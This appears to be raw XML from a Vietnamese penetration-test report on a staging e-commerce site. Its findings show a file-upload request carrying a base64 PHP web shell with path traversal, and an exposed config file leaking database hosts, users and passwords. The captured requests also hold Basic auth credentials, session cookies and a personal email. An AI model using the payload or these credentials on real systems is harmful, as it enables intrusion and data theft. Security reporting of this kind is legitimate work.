          <w:p w14:paraId="145937EC" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00013A35" w:rsidRDefault="00957D8C" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00957D8C">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>N/A</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00780F62" w:rsidRPr="00013A35" w14:paraId="2E7D12D1" w14:textId="77777777" w:rsidTr="00013A35">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="002B149C" w14:textId="77777777" w:rsidR="00780F62" w:rsidRPr="00013A35" w:rsidRDefault="00780F62" w:rsidP="00780F62">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>CONDITION</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="0FC25D2C" w14:textId="77777777" w:rsidR="00780F62" w:rsidRPr="00013A35" w:rsidRDefault="00780F62" w:rsidP="00780F62">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00957D8C">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>Anonymous User</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="00957D8C">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0F4795C1" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRDefault="00CC4809" w:rsidP="00780F62">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4848D126" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRDefault="00CC4809" w:rsidP="00780F62">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:sectPr w:rsidR="00CC4809" w:rsidSect="00CC4809">
          <w:type w:val="continuous"/>
          <w:pgSz w:w="11909" w:h="16834" w:code="9"/>
          <w:pgMar w:top="1134" w:right="1134" w:bottom="1134" w:left="1418" w:header="680" w:footer="783" w:gutter="0"/>
          <w:cols w:space="720"/>
          <w:docGrid w:linePitch="360"/>
        </w:sectPr>
      </w:pP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327"/>
      </w:tblGrid>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Request 2:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2395A845" w14:textId="5FF8661E" w:rsidR="0077026D" w:rsidRDefault="0048674E" w:rsidP="00780F62">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0048674E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>""POST /upload.php HTTP/1.1</w:t>
              <w:br/>
              <w:t>Host: staging2.nguyenkimmall.com</w:t>
              <w:br/>
              <w:t>Cookie: sid_customer_82df3=4ea544d166691d870cc59667cd8d1c13-C; mp_skin=desktop; _ga_RWCJ26V2KQ=GS1.1.1621412990.4.1.1621414327.0; _utm_objs=; _pk_id.554926188.f710=376340701.1621399208.4.1621414310.1621413015.; _ga=GA1.2.122288110.1621399209; _ac_client_id=376340701.1621399209; _asm_visitor_type=r; _ac_an_session=zhzlznzhzizjzjzmzjzizdzgzkzlzgznzjzkzjzizdzizlzhziznziznzjzlzgzdzhzdzizlzhziznziznzgzizizdzizlzhziznziznzgzizizdzhzdzhzqzdzizd2f27zdzgzdzlzmzmzhzkzd; au_id=376340701; _ac_au_gt=1621399209539; gr_reco=17982ec8c2d-a3443b6d74673b0d; _gid=GA1.2.91465732.1621399213; nkudt=%7B%22ct%22%3A%22%5C%2FD0AL5C2DsZrH6znUWV2g4YezsZS%2BQKW8Oay8E6JIj%5C%2FNsDxONrScTkjjEKwMxiiZi24YmIe3Cw1qUopVmR60c2KqD1NyZs4j%2BAVzqE5Aw9%2BHbplm18E3qhsOUmvbkcbn%22%2C%22iv%22%3A%22ef98fd3771f4f0d70c847a7e20b5c6ef%22%2C%22s%22%3A%224847753923403249%22%7D; user_track_data=%7B%22identify_id%22%3A%22d41d8cd98f00b204e9800998ecf8427e%22%2C%22identify_name%22%3A%22Kiet+Anhh%22%2C%22identify_phone%22%3A%22%22%2C%22identify_email%22%3A%22ranoxpvp%40gmail.com%22%2C%22identify_address%22%3A%22%22%7D; _asm_uid=376340701; recently_products=14827%2C2047%2C85210%2C88446%2C47882%2C94048; recommend_products=10905%2C11442%2C20931%2C32630%2C41024%2C89007%2C36030%2C20853%2C64842%2C71716; nkcarttime=1621410855; current_state=001; _fbp=fb.1.1621400528403.1371688865; cto_bundle=_PLj4l9MWVY5MXMwb2V1ZXd2VlpnMDd1cnElMkJ4SyUyQjRlRE1HMExra1NmQ2hZSkslMkZDNFFCT2tzVHpTbFNob1JQVlBGNGRkVXVRN2kwc1lzNFJaS1dhbWFINk5vdzcwdXVLY1ZwcW1ZYTI2Rm5Kb3pySHVVT1BkSEtGOXhvaDhEZkdpRDVWdWJ4Q2x4N2VqeHUlMkI2aWZqVVJOM2FRcGIyS0I4TmphbURLQmZHUlZSWUNkTXExOXQlMkZDUnpzJTJGVEZvbXh6Q0FSSDhOcVlEb05KbG12eEZUMnNGODlEdXRRJTNEJTNE; PHPSESSID=17fo0tj0mp7lj0eg38ptvpo2q5; _pk_ses.554926188.f710=*; ai_client_id=12099609615.1621414009; an_session=zlzqzqzkzrzqzhzizkzdzizhzjzqzqzlzjzqzlzizmzdzizlzhziznziznzjzjzqzdzhzdzizlzhziznziznzjzjzqzdzizlzhziznziznzjzjzqzdzjzdzhzqzdzizd2f27zdzjzdzlzmzmzhzk; au_aid=12099609615; dgs=1621414021%3A3%3A0; au_gt=1621414009155; _ants_services=%5B%22tags%22%2C%22cuid%22%5D; _ants_event_his=%7B%22action%22%3A%22checkout%22%2C%22time%22%3A1621414022310%7D; _ants_utm_v2=; nkcart=1; gr_rt=17982ec8c2d-a3443b6d74673b0d; _gat_UA-251534152-1=1</w:t>
              <w:br/>
              <w:t>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:88.0) Gecko/20100101 Firefox/88.0</w:t>
              <w:br/>
              <w:t>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</w:t>
              <w:br/>
              <w:t>Accept-Language: en-US,en;q=0.5</w:t>
              <w:br/>
              <w:t>Accept-Encoding: gzip, deflate</w:t>
              <w:br/>
              <w:t>Content-Type: application/x-www-form-urlencoded</w:t>
              <w:br/>
              <w:t>Authorization: Basic c3RhZ2luZ25rOlN0QWExSStuZyFOaw==</w:t>
              <w:br/>
              <w:t>Upgrade-Insecure-Requests: 1</w:t>
              <w:br/>
              <w:t>Te: trailers</w:t>
              <w:br/>
              <w:t>Connection: close</w:t>
              <w:br/>
              <w:t>Content-Length: 126</w:t>
              <w:br/>
              <w:t/>
              <w:br/>
              <w:t>fileData=PGgxPktpZXROQSBkeiBmciBIUFQgQ3liZXIgc2VjPC9oMT4KPD89YCRfR0VUWzBdYCA/Pg==&amp;fileName=../../../../images/kiett.php.orionn""</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Response 2:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2395A845" w14:textId="5FF8661E" w:rsidR="0077026D" w:rsidRDefault="0048674E" w:rsidP="00780F62">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0048674E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>""HTTP/1.1 200 OK</w:t>
              <w:br/>
              <w:t>Server: nginx</w:t>
              <w:br/>
              <w:t>Date: Wed, 19 May 2021 09:18:53 GMT</w:t>
              <w:br/>
              <w:t>Content-Type: text/html; charset=UTF-8</w:t>
              <w:br/>
              <w:t>Content-Length: 7</w:t>
              <w:br/>
              <w:t>Connection: close</w:t>
              <w:br/>
              <w:t>X-Powered-By: PHP/7.0.29</w:t>
              <w:br/>
              <w:t>Cache-Control: max-age=3600</w:t>
              <w:br/>
              <w:t>Expires: Wed, 19 May 2021 10:18:53 GMT</w:t>
              <w:br/>
              <w:t>Vary: Accept-Encoding,User-Agent</w:t>
              <w:br/>
              <w:t>Access-Control-Allow-Origin: *</w:t>
              <w:br/>
              <w:t>Access-Control-Allow-Origin: *</w:t>
              <w:br/>
              <w:t/>
              <w:br/>
              <w:t/>
              <w:br/>
              <w:t>Success"</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Image-2021-05-19 16:32:38:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2395A845" w14:textId="5FF8661E" w:rsidR="0077026D" w:rsidRDefault="0048674E" w:rsidP="00780F62">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0048674E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>"N/A"</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Request 1:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2395A845" w14:textId="5FF8661E" w:rsidR="0077026D" w:rsidRDefault="0048674E" w:rsidP="00780F62">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0048674E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>""GET /tsconfig.json HTTP/1.1</w:t>
              <w:br/>
              <w:t>Host: staging2.nguyenkimmall.com</w:t>
              <w:br/>
              <w:t>Cookie: sid_customer_82df3=4ea544d166691d870cc59667cd8d1c13-C; mp_skin=desktop; _ga_RWCJ26V2KQ=GS1.1.1621412990.4.1.1621415487.0; _utm_objs=; _pk_id.554926188.f710=376340701.1621399208.4.1621415487.1621413015.; _ga=GA1.2.122288110.1621399209; _ac_client_id=376340701.1621399209; _asm_visitor_type=r; _ac_an_session=zhzlznzhzizjzjzmzjzizdzgzkzlzgznzjzkzjzizdzizlzhziznziznzjzlzgzdzhzdzizlzhziznzizmznzrzkzdzizlzhziznzizmznzrzkzdzhzdzhzqzdzizd2f27zdzgzdzlzmzmzhzkzd; au_id=376340701; _ac_au_gt=1621399209539; gr_reco=17982ec8c2d-a3443b6d74673b0d; _gid=GA1.2.91465732.1621399213; nkudt=%7B%22ct%22%3A%22%5C%2FD0AL5C2DsZrH6znUWV2g4YezsZS%2BQKW8Oay8E6JIj%5C%2FNsDxONrScTkjjEKwMxiiZi24YmIe3Cw1qUopVmR60c2KqD1NyZs4j%2BAVzqE5Aw9%2BHbplm18E3qhsOUmvbkcbn%22%2C%22iv%22%3A%22ef98fd3771f4f0d70c847a7e20b5c6ef%22%2C%22s%22%3A%224847753923403249%22%7D; user_track_data=%7B%22identify_id%22%3A%22d41d8cd98f00b204e9800998ecf8427e%22%2C%22identify_name%22%3A%22Kiet+Anhh%22%2C%22identify_phone%22%3A%22%22%2C%22identify_email%22%3A%22ranoxpvp%40gmail.com%22%2C%22identify_address%22%3A%22%22%7D; _asm_uid=376340701; recently_products=14827%2C2047%2C85210%2C88446%2C47882%2C94048; recommend_products=10905%2C11442%2C20931%2C32630%2C41024%2C89007%2C36030%2C20853%2C64842%2C71716; nkcarttime=1621410855; current_state=001; _fbp=fb.1.1621400528403.1371688865; cto_bundle=_PLj4l9MWVY5MXMwb2V1ZXd2VlpnMDd1cnElMkJ4SyUyQjRlRE1HMExra1NmQ2hZSkslMkZDNFFCT2tzVHpTbFNob1JQVlBGNGRkVXVRN2kwc1lzNFJaS1dhbWFINk5vdzcwdXVLY1ZwcW1ZYTI2Rm5Kb3pySHVVT1BkSEtGOXhvaDhEZkdpRDVWdWJ4Q2x4N2VqeHUlMkI2aWZqVVJOM2FRcGIyS0I4TmphbURLQmZHUlZSWUNkTXExOXQlMkZDUnpzJTJGVEZvbXh6Q0FSSDhOcVlEb05KbG12eEZUMnNGODlEdXRRJTNEJTNE; PHPSESSID=17fo0tj0mp7lj0eg38ptvpo2q5; _pk_ses.554926188.f710=*; ai_client_id=12099609615.1621414009; an_session=zlzqzqzkzrzqzhzizkzdzizhzjzqzqzlzjzqzlzizmzdzizlzhziznziznzjzjzqzdzhzdzizlzhziznziznzjzjzqzdzizlzhziznziznzjzjzqzdzjzdzhzqzdzizd2f27zdzjzdzlzmzmzhzk; au_aid=12099609615; dgs=1621414021%3A3%3A0; au_gt=1621414009155; _ants_services=%5B%22tags%22%2C%22cuid%22%5D; _ants_event_his=%7B%22action%22%3A%22checkout%22%2C%22time%22%3A1621414022310%7D; _ants_utm_v2=; nkcart=1</w:t>
              <w:br/>
              <w:t>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:88.0) Gecko/20100101 Firefox/88.0</w:t>
              <w:br/>
              <w:t>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</w:t>
              <w:br/>
              <w:t>Accept-Language: en-US,en;q=0.5</w:t>
              <w:br/>
              <w:t>Accept-Encoding: gzip, deflate</w:t>
              <w:br/>
              <w:t>Authorization: Basic c3RhZ2luZ25rOlN0QWExSStuZyFOaw==</w:t>
              <w:br/>
              <w:t>Upgrade-Insecure-Requests: 1</w:t>
              <w:br/>
              <w:t>If-Modified-Since: Mon, 08 Mar 2021 07:26:21 GMT</w:t>
              <w:br/>
              <w:t>Te: trailers</w:t>
              <w:br/>
              <w:t>Connection: close</w:t>
              <w:br/>
              <w:t/>
              <w:br/>
              <w:t>""</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Response 1:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2395A845" w14:textId="5FF8661E" w:rsidR="0077026D" w:rsidRDefault="0048674E" w:rsidP="00780F62">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0048674E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>""HTTP/1.1 304 Not Modified</w:t>
              <w:br/>
              <w:t>Server: nginx</w:t>
              <w:br/>
              <w:t>Date: Wed, 19 May 2021 09:35:44 GMT</w:t>
              <w:br/>
              <w:t>Connection: close</w:t>
              <w:br/>
              <w:t>Expires: Wed, 19 May 2021 09:38:44 GMT</w:t>
              <w:br/>
              <w:t>Cache-Control: max-age=180</w:t>
              <w:br/>
              <w:t>Vary: Accept-Encoding,User-Agent</w:t>
              <w:br/>
              <w:t>Access-Control-Allow-Origin: *</w:t>
              <w:br/>
              <w:t/>
              <w:br/>
              <w:t/>
              <w:br/>
              <w:t>{</w:t>
              <w:br/>
              <w:t xml:space="preserve">  "read": {</w:t>
              <w:br/>
              <w:t xml:space="preserve">    "db_host": "123.30.128.124",</w:t>
              <w:br/>
              <w:t xml:space="preserve">    "db_user": "devnk_user",</w:t>
              <w:br/>
              <w:t xml:space="preserve">    "db_password": "s7jtpXQQcEnkl1C",</w:t>
              <w:br/>
              <w:t xml:space="preserve">    "db_name": "devnk_db"</w:t>
              <w:br/>
              <w:t xml:space="preserve">  },</w:t>
              <w:br/>
              <w:t xml:space="preserve">  "write": {</w:t>
              <w:br/>
              <w:t xml:space="preserve">    "db_host": "171.244.26.182",</w:t>
              <w:br/>
              <w:t xml:space="preserve">    "db_user": "nk_dung",</w:t>
              <w:br/>
              <w:t xml:space="preserve">    "db_password": "IyZap05REPEdD",</w:t>
              <w:br/>
              <w:t xml:space="preserve">    "db_name": "newnguyenkim_db_clone"</w:t>
              <w:br/>
              <w:t xml:space="preserve">  }</w:t>
              <w:br/>
              <w:t>}"</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Image-2021-05-19 16:36:44:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2395A845" w14:textId="5FF8661E" w:rsidR="0077026D" w:rsidRDefault="0048674E" w:rsidP="00780F62">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0048674E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>"N/A"</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bookmarkEnd w:id="14"/>
      <w:bookmarkEnd w:id="18"/>
    </w:tbl>
    <w:p w14:paraId="740EE71E" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRDefault="00CC4809" w:rsidP="00B25F11"/>
    <w:p w14:paraId="7AC56920" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRDefault="00CC4809" w:rsidP="00B25F11">
      <w:pPr>
        <w:sectPr w:rsidR="00CC4809" w:rsidSect="00CC4809">
          <w:type w:val="continuous"/>
          <w:pgSz w:w="11909" w:h="16834" w:code="9"/>
          <w:pgMar w:top="1134" w:right="1134" w:bottom="1134" w:left="1418" w:header="680" w:footer="783" w:gutter="0"/>
          <w:cols w:space="720"/>
          <w:docGrid w:linePitch="360"/>
        </w:sectPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="31D58882" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00B25F11" w:rsidRDefault="003B77D1" w:rsidP="00760616">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r w:rsidRPr="00B25F11">
        <w:t>Review Old, Backup and Unreferenced Files for Sensitive Information (OTG-CONFIG-004)</w:t>
      </w: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395"/>
        <w:gridCol w:w="2695"/>
        <w:gridCol w:w="1868"/>
        <w:gridCol w:w="2369"/>
      </w:tblGrid>
      <w:tr w:rsidR="006D295D" w:rsidRPr="00013A35" w14:paraId="7E400094" w14:textId="77777777" w:rsidTr="001B336C">
        <w:trPr>
          <w:trHeight w:val="530"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9327" w:type="dxa"/>
            <w:gridSpan w:val="4"/>
            <w:shd w:val="clear" w:color="auto" w:fill="00B0F0"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="67E2AE27" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00013A35" w:rsidRDefault="006D295D" w:rsidP="00013A35">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:bookmarkStart w:id="15" w:name="OLE_LINK1"/>
            <w:bookmarkStart w:id="19" w:name="OLE_LINK2"/>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>VULNERABILITY INFORMATION</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006D295D" w:rsidRPr="00013A35" w14:paraId="4620D5F6" w14:textId="77777777" w:rsidTr="00013A35">
        <w:trPr>
          <w:trHeight w:val="350"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="78633BFA" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00013A35" w:rsidRDefault="006D295D" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:rStyle w:val="PlaceholderText"/>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>CATEGORY</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="1200DCBC" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00013A35" w:rsidRDefault="007A3E4C" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0050547A">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>[[Critical.Vuln.Category_Vuln]:unprocessed]</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="0050547A">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006D295D" w:rsidRPr="00013A35" w14:paraId="50C0821E" w14:textId="77777777" w:rsidTr="00013A35">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="74BD2B03" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00013A35" w:rsidRDefault="006D295D" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>DESCRIPTION</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="1827FA78" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00013A35" w:rsidRDefault="0050547A" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0050547A">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>Hệ thống chứa tệp tsconfig.json ở thư mục root và không phân quyền truy cập, kẻ tấn công có thể thoải mái truy cập và có được thông tin kết nối cơ sở dữ liệu</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002214F4" w:rsidRPr="00013A35" w14:paraId="36C833CB" w14:textId="77777777" w:rsidTr="00013A35">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="044C9F68" w14:textId="77777777" w:rsidR="002214F4" w:rsidRPr="00013A35" w:rsidRDefault="002214F4" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>SEVERITY</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC0CB"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="0A8BF87B" w14:textId="77777777" w:rsidR="002214F4" w:rsidRPr="00013A35" w:rsidRDefault="002216B2" w:rsidP="00013A35">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>Critical</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0056691F" w:rsidRPr="00013A35" w14:paraId="0659B1EB" w14:textId="77777777" w:rsidTr="00013A35">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="3977B38F" w14:textId="77777777" w:rsidR="002214F4" w:rsidRPr="00013A35" w:rsidRDefault="002214F4" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>IMPACT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2695" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FF0000"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="4030535C" w14:textId="77777777" w:rsidR="002214F4" w:rsidRPr="00013A35" w:rsidRDefault="003B048E" w:rsidP="00013A35">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1868" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="18FAC52B" w14:textId="77777777" w:rsidR="002214F4" w:rsidRPr="00013A35" w:rsidRDefault="0056691F" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>LIKELIHOOD</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2369" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FF0000"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="676AC6CE" w14:textId="77777777" w:rsidR="002214F4" w:rsidRPr="00013A35" w:rsidRDefault="00636316" w:rsidP="00013A35">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
